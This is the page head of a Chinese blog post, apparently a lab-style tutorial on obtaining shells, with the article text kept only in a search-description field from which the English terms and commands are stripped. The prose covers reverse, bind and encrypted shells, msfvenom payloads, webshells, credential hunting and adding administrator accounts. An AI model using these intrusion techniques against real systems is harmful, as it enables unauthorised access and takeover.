<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>shell学习 | hybcx</title><meta name="keywords" content="Metasploit"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="shell学习"><meta name="application-name" content="shell学习"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="shell学习"><meta property="og:url" content="http://hybcx.xyz/2024/03/24/shell-xue-xi/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 什么是shell 在我们了解 发送和接收shell之前，知道 shell 实际上是什么非常重要。用最简单的术语来说，我们在与命令行环境(CLI)做接口时所使用的就是shell。换句话说，Linux 中常见的 bash 或 sh 程序就是 shell，Windows 上的 cmd.exe 和"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 什么是shell 在我们了解 发送和接收shell之前，知道 shell 实际上是什么非常重要。用最简单的术语来说，我们在与命令行环境(CLI)做接口时所使用的就是shell。换句话说，Linux 中常见的 bash 或 sh 程序就是 shell，Windows 上的 cmd.exe 和"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/03/24/shell-xue-xi/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'shell学习',
  postAI: '',
  pageFillDescription: '0x01 什么是shell, 0x02 工具介绍, Netcat, Socat, Metasploit – multi/handler, Msfvenom, 0x03 shell类型, Reverse shells（反向shell）, Bind shells（绑定shell）, 0x04 Netcat, Netcat建立反向shell, Netcat建立绑定shell, 0x05 shell的稳定化, 技巧1 Python, 技巧2 rlwrap, 技巧3 Socat, 0x06 Socat, Reverse Shells（反向shell）, Bind Shells（绑定shell）, 0x07 Socat加密shell, 加密反向shell, 加密绑定shell, 0x08 常用shell payload, 0x09 Msfvenom生成shell payload, 0x10 Metasploit multi/handler模块, 0x11 webshell介绍, 0x12 获取shell之后的操作, 0x13 练习与实践, Linux Practice Box, 练习1, 练习2, 练习3, 练习4, 练习5, 练习6, 练习7, 练习8, 练习9, 练习10什么是在我们了解发送和接收之前知道实际上是什么非常重要用最简单的术语来说我们在与命令行环境做接口时所使用的就是换句话说中常见的或程序就是上的和也是在针对远程系统时有时可以强制应用程序在服务器上运行例如来执行任意代码当这种情况发生时我们希望使用这个初始访问来获得在目标上运行的简单地说我们可以强制远程服务器向我们发送对服务器的命令行访问反向或者在服务器上打开一个端口我们可以连接到这个端口以执行更多的命令绑定我们将在整个房间中更详细地介绍这两种场景这个房间的格式如下房间的大部分内容由信息组成代码块和屏幕截图中给出了示例房间的最后两项任务中有两台虚拟机一台是一台是这些可以用来练习所演示的技术任务中有示例练习题请随意完成这些练习或者在完成任务时按照任务进行操作话不多说让我们开始吧工具介绍我们将使用多种工具来接收反向和发送绑定一般来说我们需要恶意的代码以及与生成的进行接口的方法我们将在下面简要讨论其中的每一项是传统的网络瑞士军刀它用于手动执行各种网络交互包括在枚举时抓取横幅更重要的是它可以用于接收反向以及连接到远程端口以绑定目标系统上的在默认情况下非常不稳定容易丢失但是我们可以通过一定技术来加以改进就像升级版的它可以做和相同的事情而且能够做更多通常比开箱即用的更稳定从这个意义上说它远远优于然而也有两个大的缺陷语法更加困难在默认情况下几乎每个发行版都会安装但很少会默认安装和在上都有版本框架的模块与和一样可以用于接收反向由于是框架的一部分提供了一种获得稳定的完全成熟的方法并提供了多种进一步改进所捕获的的选项模块是可以与进行交互的方法并且也是处理分段有效载荷的最简单方法与一样在技术上也是框架的一部分然而它是作为一个独立的工具发布的用于动态生成可以产生除了反向和绑定以外的其他有效载荷除了我们已经介绍过的工具之外还有许多用不同编程语言书写的关于利用的项目和资料比如预先安装了各种默认路径是还有一个项目虽然主要是发挥字典功能但是也包含了一些非常有用的用于获取的代码类型从更高的层次上来说当涉及到一个可利用目标时我们只对两种感兴趣反向绑定反向反向是指目标被迫执行一段代码并以此连接到你的计算机在你自己的计算机上你可以使用前面提到的工具之一来设置一个用于接收连接的监听器反向是绕过防火墙规则的一个好方法因为防火墙规则可能会阻止你正向连接到目标上的任意端口然而有一个缺点是当从互联网上的一台机器接收时你需要先配置好你自己的网络绑定当在目标上执行的代码用于启动一个直接连接到目标机器的的监听器时就称为绑定然后这将使目标向互联网开放这意味着你可以连接到代码打开的端口并通过这种方式获得远程代码执行这样做的好处是不需要你在自己的网络上进行任何配置但是该行为可能会被保护目标的防火墙加以阻止一般情况下反向更容易执行和调试反向的例子请看下面的图片在左边我们有一个反向侦听器它接收连接而右边是发送反向的模拟目标实际上这更可能是通过远程网站上的代码注入或类似的注入来完成的把左边的图像想象成你自己的电脑把右边的图像想象成你的目标在攻击机你的系统上在目标机上指的是攻击机上的和正在监听的端口注意在右边运行命令之后左边的监听器将接收到一个连接连接成功后运行命令能看到我们能够作为目标用户去执行命令重要的是我们在监听我们自己的攻击机上的端口由目标机发送连接到攻击机绑定的例子绑定不太常见但仍然非常有用请看下面的图片同样左边是攻击者的电脑右边是模拟目标为了稍微改变一下这次我们将使用目标首先我们在右边的目标上启动一个监听器这一次我们告诉它执行然后当目标机上的监听器启动并运行时我们从自己的机器发送连接到目标机上新打开的端口在目标机上设置监听器当监听器被触发时执行程序在攻击机上发出连接请求指的是目标机的和打开的端口正如你所看到的这再次为我们提供了在远程计算机上执行代码的机会注意这种情况不是特有的重要的是要明白我们正在目标上开启监听器然后用我们自己的机器主动去连接到它目标最后一个与本小节相关的概念是交互性可以是交互式的也可以是非交互式的交互式如果你使用过或任何其他标准的命令行环境那么你已经接触过交互式交互式允许你在执行程序之后与它们发生交互例如使用登录在这里你可以看到它以交互方式请求用户输入或以继续进行登录连接这是一个交互式程序它需要一个交互式才能运行非交互式非交互式不会给你发生交互的机会在非交互式中只能使用不需要用户交互就能正常运行的程序不幸的是大多数简单的反向和绑定都是非交互式的这可能会使进一步的漏洞利用变得更加棘手让我们看看在非交互式中运行时会发生什么由上图可以看到命令非交互式执行得非常完美但命令交互式根本不会给我们任何输出不过有趣的是交互式命令的输出确实可以到达某个地方可以说交互式程序不能在非交互式中工作此外在截图中可以看到一个名为的命令此命令是用于演示的攻击机器自定义的独有别名是命令的速记方法除非你在本地配置了这个别名否则它不会在任何其他机器上工作建立反向建立反向需要执行反向代码以及设置监听器执行的方法有很多所以我们先从设置监听器开始使用启动监听器的语法如下用来告诉这将是一个监听器用于请求详细输出告诉不要解析主机名或者使用指定端口常用参数列表用于指定将处于侦听模式指定该参数则意味着被当作侦听并接受连接而非向其它地址发起连接本地端口指定发送数据的源地址适用于多网卡机指定使用协议默认为输出交互或出错信息新手调试时尤为有用超时秒数后面跟数字表示表示扫描时不发送任何数据延时的间隔连接关闭仍然继续监听指定数字不能用记录进制的传输随机本地及远程端口使用交互方式上一个小节中使用的端口是实际上你可以使用任何你喜欢的端口只要这个端口还没有被服务所占用请注意如果选择使用低于的端口则在启动监听器时需要使用使用一个众所周知的端口号或通常是一个好主意因为这更有可能绕过目标的出站防火墙规则例子然后我们可以使用任意数量的有效载荷连接到这个目标具体情况取决于目标环境建立绑定如果我们希望在目标上获得绑定那么我们可以假设在目标机的选定端口上已经有一个监听器正在等待我们我们所需要做的就是使用攻击机主动连接到它这句话的语法相对简单攻击机发出连接到目标机在这里我们使用指定我们选择的目标机端口目标机上的监听器正在监听的端口以此建立到目标机的向外连接在本文后面的内容中将会讲解如何使用在目标机上设置监听器的稳定化我们已经捕获或连接到一个接下来该做什么对进行稳定化处理默认情况下这些非常不稳定按下就会杀死整个程序而且它们是非交互的经常会有奇怪的格式错误这是因为实际上是在终端内运行的进程而不是真正的终端本身幸运的是在系统上有许多稳定的方法我们会在这里提到三个反向的稳定化往往要困难得多然而我们将要在这里介绍的第二个技巧对它也特别有用技巧我们将讨论的第一种技巧只适用于机器因为在默认情况下机器几乎总是会安装这是一个分为三个阶段的过程稳定化的前提是已经获得或者连接到首先要做的是使用命令它将使用产生一个功能更好的请注意有些目标可能需要指定版本如果是这样的话根据需要将替换为或这时我们的会看起来更好一些但是我们仍然不能使用键自动补全功能或者方向键功能按下仍然会杀死这个第二步是执行这将使我们能够访问一些术语命令例如命令最后也是最重要的我们将使用按键对进行后台化处理对后台化之后再前台化用回到我们自己的终端前台执行上面的前台化命令将会做两件事首先这个前台化命令会关闭我们自己本身的终端输出它允许我们访问键自动补全方向键和按下终止进程然后再将之前建立的反向前台化从而完成稳定化过程完整的过程如下实质上是用反向取代了我们自己原来使用的终端注意如果失效你的终端中的任何输入都将不可见这是由于原终端回显被禁用要解决这个问题请输入命令然后按下回车键技巧是一个程序简单地说它可以让我们在捕获到时立即访问历史记录自动补全键和方向键然而如果你想在这个中使用还是必须使用一些其他技巧进一步稳定化默认情况下没有安装所以如果要在中使用请先安装一下要使用我们需要调用一个稍微不同的监听器在监听器前面加上可以提供一个功能更全面的这个技巧在处理的时特别有用因为众所周知的很难稳定在处理目标时可以使用与前面第一个技巧中的第三个步骤相同的方法来完全稳定化先用后台化然后再使用命令来稳定化并重新进入技巧稳定的第三个简单方法是使用一个初始的作为进入功能更全面的的垫脚石请记住这种技巧最好是针对目标因为上的不会比更稳定为了实现这种稳定方法我们首先需要将一个静态编译的二进制文件编译为没有依赖关系的程序的一个版本传输到目标机器上一个典型的实现方法是让攻击机在包含二进制文件的目录中开启一个简易的然后在目标机器上使用界面下载文件在上这可以通过或来完成为了完整性起见在这里附上目标机是操作系统的情况在一个命令行环境中同样的事情下载文件也可以在中完成使用或者系统类这取决于安装的版本在接下来的小节中我们将介绍使用发送和接收的语法二进制文件下载地址点击将自动下载官网使用以上任何一种技术都可以更改终端大小这是你的终端在使用常规时会自动完成的事情但是如果你想打开类似文本编辑器的东西来覆盖屏幕上的所有内容即在终端中打开文本编辑器那么必须在反向或绑定中手动完成终端界面宽高尺寸的更改首先打开另一个终端并运行这将为你提供大量的输出流记下开头部分行和列的值接下来在反向绑定中输入以下两个命令填写你刚才在自己的终端上运行命令所得到的行和列的值这将改变反向绑定界面的宽度和高度从而使一些程序如文本编辑器能够依赖于这些宽高信息的准确性来正确地打开在某些方面与相似但在其他许多方面有根本不同理解的最简单方法是把它当做一个两点之间的连接器这两个点实际上可以是一个监听端口和键盘也可以是一个监听端口和一个文件或者可以是两个监听端口而所做的只是提供两点之间的链接让我们再次从反向开始反向如前所述的语法比的语法难得多下面是在中设置反向监听器的基本语法在中这需要获取两个点一个监听端口和一个标准输入并将它们连接在一起如此建立的是不稳定的但它可以在或上工作相当于中的在操作系统的目标机上我们使用这个命令来连接攻击机选项用于强制或使用风格的标准输入和输出形式在系统的目标机上使用以下命令来连接攻击机绑定在目标上我们将使用以下命令设置监听器在目标上我们将使用以下命令设置监听器我们使用参数来连接和在命令行环境中处理输入和输出的方式不管目标是什么我们在攻击机器上使用以下命令来连接到正在目标机上等待的监听器现在让我们看看更强大的用途之一建立完全稳定的反向这仅在目标是时有效会建立一个更稳定的反向如前所述是一个非常通用的工具以下技巧可能是其最有用的应用之一这是新的监听器设置语法让我们分析此命令像往常一样我们将两个点连接在一起但是在这里的点是监听端口和文件具体地说我们将当前的含义为终端作为文件传递并将它的回显设置为零这大约相当于使用以及的技巧这样处理的额外好处是能够立即建立一个稳定的并能连接到完整的终端普通的监听器可以连接到任何有效负载然而上面这个特殊的监听器必须用一个非常具体的命令来激活这意味着目标机必须安装大多数机器默认情况下没有安装但是我们可以上传一个预编译的二进制文件然后继续正常执行我们的命令预编译的二进制文件特殊命令如下这是一个很复杂的命令所以让我们分解一下第一部分很简单我们正在与在我们自己的攻击机上运行的监听器进行连接第二部分使用创建一个交互式会话我们还传递了参数和在目标上分配一个伪终端这是稳定化过程的一部分确保在中能够显示错误消息通常是非交互式的问题将任何命令传递到子进程中允许我们在中使用终止命令在新会话中创建进程稳定终端试图将终端正常化这看起来有很多东西需要考虑所以让我们看看它的实际效果在左边我们有一个监听器运行在我们的本地攻击机上在右边我们有一个已经建立好的反向正在使用非交互式运行我们使用非交互式的执行特殊的命令并在左侧的监听器中接收一个完全交互式的请注意是完全交互式的允许我们使用交互式命令例如然后我们还可以通过设置上一个小节中所提到的值来进一步改进这将让我们能够更好地使用文本编辑器如或如果突然无法正常工作则可以通过在命令中添加来增加信息输出的详细程度这在实验环境下非常有用但在一般用途中通常不是必需的加密的许多优点之一就是它能够创建加密的绑定和反向除非你有解密密钥否则无法监视加密的这样通常能够绕过检测我们在前面讨论了如何创建基本的因此在这里不再讨论一些基本语法可以说只要把用作命令的一部分就应该在使用加密时将其替换为我们将在本小节结束时介绍一些示例但首先让我们谈谈证书加密反向为了建立加密的我们首先需要生成一个证书这在我们的攻击机上很容易做到该命令会创建一个位的密钥以及一个匹配的文件有自签名且有效期不到一年当你运行此命令时它将要求你填写有关证书的信息你可以留空也可以随机填写然后我们需要将刚才两个创建的文件合并到一个文件中现在当我们设置反向监听器时可以使用以下命令这将使用我们生成的证书设置一个监听器参数告诉连接不要费心尝试验证我们的证书是否已由公认的权威机构正确签名请注意证书必须在正在监听的设备上使用即有监听器的地方就要有文件设置好监听器后为了回连到该监听器我们将使用加密绑定建立加密的绑定也采用和上面同样的技巧目标机上攻击机上再次注意即使是针对目标机建立绑定证书也必须与监听器一起使用因此需要为绑定复制文件下图显示了来自目标的反向左边是攻击机终端界面右边是已经建立的非交互式反向界面右边的是自定义的别名这种加密技巧也适用于上一个小节中介绍的特殊的仅限的终端反向弄清楚它的语法将是本小节答题的关键对技巧的加密处理设置攻击机上的监听器对技巧的加密处理让目标机常用之前有提到我们正在寻找一些方法来使用作为绑定的监听器所以我们将从它开始在的某些版本中包括版的也附带了位于还有本身使用的版本即都有一个选项允许你在的连接上执行进程例如在目标机上设置监听器时用连接到上面的监听器将在目标上产生一个绑定同样对于反向在目标机上执行以下命令目标机将回连攻击机上的监听器这样会产生一个反向但是大多数版本的都不包含此功能指选项因为人们普遍认为它非常不安全在几乎总是需要静态二进制文件的目标机上以上技巧指选项将完美运行然而在的目标机上我们将改为使用以下代码为绑定创建一个监听器在目标机上执行以下段落是此命令的技术说明命令本身才是最重要的该命令首先会在处创建命名管道然后它启动一个监听器并将监听器的输入连接到命名管道的输出监听器的输出即我们发送的命令再直接通过管道管道符传输到将输出流发送到并将本身发送到命名管道的输入从而完成循环关于命名管道的介绍一个非常类似的命令可以用来发送反向在目标机上执行这个命令实际上与前一个命令相同只是此命令将使用主动连接语法而不是使用监听语法下图示例中的左侧使用了自定义别名当目标是一个现代的时建立反向是非常常见的因此我们将在这里介绍标准的一行反向这个命令非常复杂因此为了简单起见这里不会直接解释它记住这是一行非常有用的命令为了使用它我们需要用适当的和端口选择来替换和然后将其复制到中并执行该命令或者使用在服务器上执行命令的另一种方法例如从而生成反向对于其他常见的反向有效载荷可以参考上的存储库其中包含了多种不同语言的代码通常以单行格式进行复制和粘贴项目链接生成作为框架的一部分主要用于生成用于反向和绑定的代码它被广泛用于开发低等级的如在开发缓冲区溢出漏洞时生成十六进制但是它也可用于生成各种格式的有效负载例如我们将在本节中使用的后一个功能的标准语法如下例如要以格式生成反向我们可以使用这里我们设定一个有效载荷涉及到四个参数选项指定输出格式在上面的命令中格式是一个可执行文件生成的有效载荷的输出位置和文件名指定要回连的即攻击机当你使用的连接到你自己的攻击机时这将是你的地址要回连的本地攻击机上的端口可以是到之间尚未使用的任何值但是设定为低于的端口时将受到限制需要以权限运行监听器分段和不分段在我们进一步讨论之前必须介绍另外两个概念分段的反向有效负载不分段的反向有效负载分段的反向有效载荷分两部分发送第一部分称为这是一段直接在服务器本身上执行的代码它会回连攻击机上等待的监听器但它本身并不包含任何反向代码第一部分的将连接到监听器并使用连接来加载真正的有效载荷这样能直接执行真正的并防止真正的接触到磁盘以免被传统的反病毒解决方案拦截因此此类有效载荷分为两部分一个小的初始段然后是在初始段启动时所下载的更大的反向代码段分段的有效载荷需要一个特殊的监听器通常是这将在下一个小节中介绍不分段的反向有效载荷更常见这些也是我们迄今为止一直在使用的它们是完全独立的因为在成功执行一段代码时会立即将发送回攻击机上等待的监听器不分段的有效载荷往往更易于使用和捕获但是它们也更庞大并且更容易被防病毒或入侵检测程序发现和删除分段的有效载荷更难使用但它的初始段要短得多有时会被效率较低的防病毒软件遗漏现代防病毒解决方案还将利用反恶意软件扫描接口来检测有效载荷这使得分段有效载荷不如以前那么有效英文意思是翻译器关于另一个要讨论是是自带的的全功能它们是完全稳定的这使得它们在针对目标机时效果非常好也有很多自己的内置功能例如文件上传和下载如果我们想使用的后渗透工具那么我们就需要先获得一个的缺点是它们必须在中才能捕获它们也被某些认证考试禁止使用因此学习关于的替代方法是个好主意有效载荷命名约定使用时了解命名系统的工作原理很重要基本的命名约定如下例如这将为的目标机生成不分段的反向此基本命名约定的例外是位操作系统的目标对于该类目标命名时不会指定操作系统的架构位数例如对于位的目标命名时将被指定为我们把命名中关于的部分再细分一下在上面的示例中使用的是这表明它是一个不分段的不分段的会用下划线表示与此等效的分段是分段会用一个斜杠表示这些规则也适用于一个针对位目标的分段名称将如下所示针对位目标的不分段名称将如下所示除了手册页之外使用时要注意的另一个命令是这可用于列出所有可用的有效载荷然后可以将其通过管道符传输到以搜索一组特定的有效载荷例如这为我们提供了一整套针对位目标的有效载荷模块是捕获反向的绝佳工具模块充当的是连接的监听器如果你想使用这是必不可少的并且这也是使用分段时的首选幸运的是它相对容易使用使用命令启动输入命令按下回车键我们现在准备开始一个会话让我们使用命令查看可用的选项我们需要设置三个选项和这些都与我们在使用生成时设置的选项相同特定于我们的目标的以及我们可以接收的监听地址和端口请注意在此处必须指定因为不会像或那样监听所有网络接口所以你必须告诉它一个特定的地址以便进行监听使用时这将是你的地址我们使用以下命令设置这些选项我们现在应该已经准备好开始监听了让我们通过使用命令这将告诉启动模块并将其作为作业在后台运行你可能注意到在上面的截图中正在监听一个以下的端口为此必须使用权限运行当在前面的中生成的分段开始运行时将接收连接并会发送剩余的然后给我们提供一个反向请注意因为在上面的案例中开始是在后台处理的所以我们需要使用命令再次将其置于前台这很有效因为它是唯一运行的会话如果还有其他活动的会话我们将需要使用命令来查看所有活动的会话然后使用命令来选择适当的会话置于前台这个数字也将显示在打开的行中你能看到介绍有时我们会遇到允许我们以某种方式上传可执行文件的网站理想情况下我们会利用这个机会上传可以激活反向或绑定的代码但有时这是不可能的所以在非理想情况下我们将改为上传请参阅我之前写的关于上传漏洞的博客文章以更广泛地了解此概念是一个通俗的术语用于指代在网络服务器通常使用或等语言中运行的脚本该脚本能在服务器上执行代码本质上命令被输入到网页中通过表单或者直接作为中的参数然后由脚本执行执行的结果返回并会写入网站页面在另一方面也能够作为进入完全成熟的反向或绑定的垫脚石由于仍然是最常见的服务器端脚本语言让我们来看一些简单的代码以一种非常基础的单行格式书写这将在中获取一个参数并使用在系统上执行它这意味着我们在中的之后输入的任何命令都将在系统上执行无论是还是元素是为了确保显示在网站页面上的结果的格式正确让我们看看实际情况请注意当导航到页面时我们在中使用了带有命令的参数然后正确地返回了目标的网络信息换句话说通过在我们上传的页面的中输入命令该命令用于检查目标上的网络接口使得命令在系统上执行并将结果返回给我们这适用于任何其他命令例如等如前所述在上默认有多种可用位于路径下包括臭名昭著的一个用编写的完整的反向请注意大多数通用的特定语言的例如反向是为基于的目标例如网络服务器编写的它们可能无法在上运行反向链接当目标是时通常使用获取或者使用生成对应服务器语言的反向绑定前一种方法通常是使用编码的来获取这将作为前面提到的中的参数复制到中这与我们在第小节中遇到的相同但是它经过了编码可以在参数中安全使用请记住和端口以上内容中的仍然需要在上面的代码中进行更改获取之后的操作好了我们有了现在怎么办我们已经介绍了许多生成发送和接收的方法这些方法都有一个共同点那就是得到的往往是不稳定的和非交互的即使是更容易稳定化的风格的的稳定性也不是非常理想那么我们能做些什么呢理想情况下在上我们会接着寻找机会访问用户帐户存储在的密钥通常是执行此操作的理想方式在中在目标机的某处发现密码凭证也不少见一些漏洞还允许你添加自己的帐户特别是像脏牛漏洞或可写的文件或文件会很快让你通过来访问目标机器假设目标机器的服务是打开的脏牛漏洞介绍而在上可利用的选项通常更加有限有时可以在注册表中找到运行服务的密码例如服务器经常将密码以明文形式存储在注册表中某些版本的服务器还会在文件中保留登录凭据可能保留凭据的文件路径是或者这些凭据可以是散列值也可以是明文具体取决于版本理想情况下在上你将获得以用户身份运行的或以高权限运行的管理员帐户在这种情况下你可以简单地将你自己的帐户在管理员组中添加到计算机然后通过或其他方法登录具体情况取决于目标机器上运行的服务其基本语法如下添加新用户添加用户到管理员组反向和绑定是在机器上获得远程代码执行的基本技术但是它们永远不会像原生那样功能齐全理想情况下我们总是希望升级为使用正常方法来访问机器因为这总是更容易用于进一步利用目标练习与实践这个章节包含了大量的信息并且几乎没有机会让你始终将其付诸实践接下来的实践与案例将包含两个虚拟机一个服务器和一个服务器每个都配置有一个简单的网络服务器请使用它上传和激活在这个案例中提供的是一个沙盒环境所以没有过滤器需要进行绕过你可以选择登录以使用或进行练习提供登录凭据和说明同时还会给出一些示例附加到此任务的盒子是一个服务器其文件上传页面在网络服务器上运行这应该用于在系统上练习上传同样本机上也安装了和因此请随意通过端口上的登录来直接使用它们进行练习登录的凭据是用户名密码练习准备一个接着在页面连接攻击机监听端练习进入文件目录修改对应与端口成功拿练习登录目标机在目标机使用建立监听端并在攻击机使用连接目标端口即可拿到绑定第二种方法适用于系统也是成功拿到接下来尝试练习反向目标机上执行练习上执行目标机执行可以看到回显会出现在两个机器上下面是绑定目标机执行执行接下来尝试建立一个完美的交互式目标机执行执行接下来尝试的加密以上是执行下面是目标机执行目标机执行执行首先开始个服务上传对应到目标机练习这里尝试直接上传但是无效这说明该内容只适用于系统练习尝试上传利用执行反弹脚本练习可以在上面练习的基础上添加用户到管理员组直接远程登录添加新用户添加用户到管理员组添加剪切板功能练习反向绑定反向绑定练习使用生成之后直接复制到目标机上即可接下来进入的监听模块练习使用练习遗留的分段发现弹回来的无法使用不能回显信息接下来尝试不分段的如下图依旧没反应结果不能我们需要使用里面的模块捕获用并不能使这个正常工作',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-05-03 16:55:14',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
